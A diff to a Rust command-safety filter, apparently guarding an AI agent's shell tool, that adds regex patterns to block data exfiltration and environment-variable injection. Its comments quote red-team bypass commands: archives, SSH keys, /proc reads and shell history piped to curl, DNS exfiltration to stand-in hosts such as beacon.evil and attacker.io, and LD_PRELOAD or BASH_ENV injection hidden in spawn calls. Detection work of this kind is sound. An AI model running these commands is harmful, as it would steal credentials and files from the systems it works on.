@@ -295,6 +295,117 @@ pub(crate) static PAYLOAD_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)>>
                     .expect("Invalid regex"),
                 "encoded system file posted to network (exfiltration)",
             ),
+            // $(cat /system/file) substitution feeding a network tool
+            // (wave-17: `printf '%s' $(cat /etc/issue) | sed … | curl`).
+            // Bounded [\s\S] span: a JSON-\n newline inside a quoted arg
+            // must not shield the downstream curl from the match.
+            (
+                Regex::new(r"\$\(\s*cat\s+/(etc|var|root|proc)/[^)]*\)[\s\S]{0,300}(curl|wget|nc|ncat)\b")
+                    .expect("Invalid regex"),
+                "system file substitution posted to network (exfiltration)",
+            ),
+            // Archive-to-network (wave-17: `tar czf - ./src | curl -X POST
+            // --data-binary @- URL`, `tar -czf - . | curl -X PUT …`) —
+            // whole-tree exfil in one pipe.
+            (
+                Regex::new(r"(tar\s+-[a-z]*c[a-z]*\s|zip\s|gzip\s)[^|\n]*\|\s*[^|\n]*(curl|wget|nc|ncat)\b")
+                    .expect("Invalid regex"),
+                "archive piped to network tool (exfiltration)",
+            ),
+            // Multipart form upload of a system file (wave-17: `curl -X
+            // POST -F 'file=@/etc/nginx/nginx.conf' URL`) — the -d @/path
+            // pattern only covers data flags, not -F file fields.
+            (
+                Regex::new(r#"(curl|wget)\s+[^|\n]*-[fF]\s+['"]?[a-z_]*=?@/(etc|var|root|home)/"#)
+                    .expect("Invalid regex"),
+                "system file uploaded as form field (exfiltration)",
+            ),
+            // Key/cert material read and piped to a network tool (wave-17:
+            // `for f in *.pem; do cat $f | base64 -w0; done | curl …`).
+            (
+                Regex::new(r"(cat|base64)\s+[^|\n]*\.(pem|key|crt)\b[^\n]*\|\s*[^|\n]*(curl|wget|nc|ncat)\b")
+                    .expect("Invalid regex"),
+                "key material piped to network tool (exfiltration)",
+            ),
+            // for-loop over key files feeding a network tool (wave-17:
+            // `for f in *.pem; do cat $f | base64 -w0; done | curl …`) —
+            // the per-command pattern above never sees the .pem glob.
+            (
+                Regex::new(r"for\s+\S+\s+in\s+[^;\n]*\.(pem|key|crt)\b[^\n]*(curl|wget|nc|ncat|dig|nslookup)\b")
+                    .expect("Invalid regex"),
+                "key-file loop feeding network tool (exfiltration)",
+            ),
+            // Sensitive home-dotfile content piped to a network tool
+            // (wave-17: `cat ~/.bash_history | awk … | curl …`). ~/ paths
+            // are outside the /(etc|var|root) system-file pattern.
+            (
+                Regex::new(
+                    r"(cat|head|tail|dd)\s+[^|\n]*?~/\.(bash_history|ssh|aws|gnupg|netrc|gitconfig|kube|docker|npmrc)\S*\s*(\||;|&&)[^\n]*(curl|wget|nc|ncat)\b",
+                )
+                .expect("Invalid regex"),
+                "sensitive home file piped to network tool (exfiltration)",
+            ),
+            // /proc system reads piped to a network tool (wave-17:
+            // `cat /proc/net/tcp | xxd -p | curl …`) — the system-file
+            // pattern covered etc/var/root only.
+            (
+                Regex::new(
+                    r"(cat|head|tail|dd)\s+[^|\n]*?/proc/\S*\s*(\||;|&&)[^\n]*(curl|wget|nc|ncat)\b",
+                )
+                .expect("Invalid regex"),
+                "/proc read piped to network tool (exfiltration)",
+            ),
+            // curl header carrying a command substitution (wave-17:
+            // `curl --header 'X-Sys-Info: $(uname -a | base64)' URL`) —
+            // the -d substitution pattern only watches POST data flags.
+            (
+                Regex::new(r#"(curl|wget)\s+[^|\n]*--?(header|H)\s+['"][^'"]*\$\("#)
+                    .expect("Invalid regex"),
+                "command substitution in request header (exfiltration)",
+            ),
+            // Denied env assignments hidden INSIDE interpreter spawn calls
+            // (wave-17): `awk 'BEGIN{system("LD_PRELOAD=/tmp/x.so id")}'`,
+            // `perl -e '$ENV{PATH}="/tmp:".…; exec …'`, `ruby -e
+            // "ENV['LD_PRELOAD']=…"`, `os.execve(…, {**os.environ, …})`,
+            // `xargs sh -c 'LD_PRELOAD=/x id'`. The segment-anchored
+            // DANGEROUS_ENV_VARS regex only sees assignments at command
+            // position — these carry them inside a payload.
+            (
+                Regex::new(
+                    r#"(?i)(system|execve|exec|spawn|popen|execvp|spawnl)\s*\([^)]*(ld_preload|ld_library_path|ld_audit|dyld_insert_libraries|bash_env|pythonpath|pythonstartup|node_options|path)['"]?\s*[=:]"#,
+                )
+                .expect("Invalid regex"),
+                "env injection inside spawn call",
+            ),
+            (
+                Regex::new(r#"(?i)(\$env\{|environ\[|env\[)['"]?(ld_preload|ld_library_path|ld_audit|dyld_insert_libraries|bash_env|pythonpath|pythonstartup|node_options|path)['"]?(\}|\])"#)
+                    .expect("Invalid regex"),
+                "interpreter env-table write (injection)",
+            ),
+            // ${VAR:=value} assignment expansion on a denied var (wave-17:
+            // `bash -c 'echo ${BASH_ENV:=/tmp/b.sh}'` — the := form ASSIGNS
+            // when unset; the echo is camouflage).
+            (
+                Regex::new(
+                    r"(?i)\$\{(ld_preload|ld_library_path|ld_audit|dyld_insert_libraries|bash_env|pythonpath|pythonstartup|node_options|path):=",
+                )
+                .expect("Invalid regex"),
+                "env injection via := assignment expansion",
+            ),
+            // sh -c payload carrying a denied assignment (wave-17: `xargs
+            // -I{} sh -c 'LD_PRELOAD=/tmp/lib.so id'`, `sh -c "export
+            // LD_PRELOAD; …"`). Unanchored within the -c payload.
+            // NOTE: env-wrapper forms (`env -S 'VAR=x'`, `env -u X -i Y=x`)
+            // are deliberately NOT here — validation.rs's
+            // DANGEROUS_ENV_CATCHALL covers them and produces the typed
+            // BlockedEnvInjection error the safety tests assert on.
+            (
+                Regex::new(
+                    r#"(?i)-c\s+['"][^'"]*\b(ld_preload|ld_library_path|ld_audit|dyld_insert_libraries|bash_env|pythonpath|pythonstartup|node_options)\s*="#,
+                )
+                .expect("Invalid regex"),
+                "env injection inside sh -c payload",
+            ),
             // Exfiltration channels (red-team wave-3 finding): local
             // sensitive data shipped to a remote endpoint from a shell
             // command. Four shapes seen in the wild:
@@ -303,7 +414,10 @@ pub(crate) static PAYLOAD_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)>>
             //   cat /etc/ssh/sshd_config | base64 | curl --data-binary @- …
             //   nslookup $(… | base64 …).attacker.io  (DNS exfil)
             (
-                Regex::new(r"\benv\s*\|\s*[^|]*\|\s*(curl|wget|nc)\b").expect("Invalid regex"),
+                // (\|[^|]*)* — wave-17 routed env through TWO transforms
+                // (`env | sed … | tr … | curl`); one intermediate pipe was
+                // the old limit.
+                Regex::new(r"\benv\s*\|(\s*[^|]*\|)*\s*(curl|wget|nc)\b").expect("Invalid regex"),
                 "environment piped to network tool (exfiltration)",
             ),
             (
@@ -347,6 +461,20 @@ pub(crate) static PAYLOAD_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)>>
             (
                 Regex::new(r"(nslookup|dig|host)\s+[^\n]*base64").expect("Invalid regex"),
                 "DNS lookup with encoded data (DNS exfiltration)",
+            ),
+            // DNS exfil with a variable/placeholder query (wave-17 LAN
+            // family: `cat /etc/passwd | base64 -w0 | xargs -I{} dig +short
+            // {} domain`, and the premier variant `for f in ~/.ssh/id_rsa …;
+            // do enc=$(xxd -p $f …); dig TXT +short "${enc}.beacon.evil"`);
+            // the base64-adjacent pattern above only sees the literal word.
+            // A static `dig +short example.com` stays legal — the sink must
+            // be a substitution or xargs placeholder.
+            (
+                Regex::new(
+                    r#"(nslookup|dig|host)\s+([a-z]+\s+)?(\+\S+\s+)*["']?(\{\}|\$[({a-z])"#,
+                )
+                .expect("Invalid regex"),
+                "DNS lookup with variable query (DNS exfiltration)",
             ),
             // Exfil variants from red-team wave 4:
             //   curl -d "token=$(base64 /etc/shadow)" URL   (substitution in POST data)
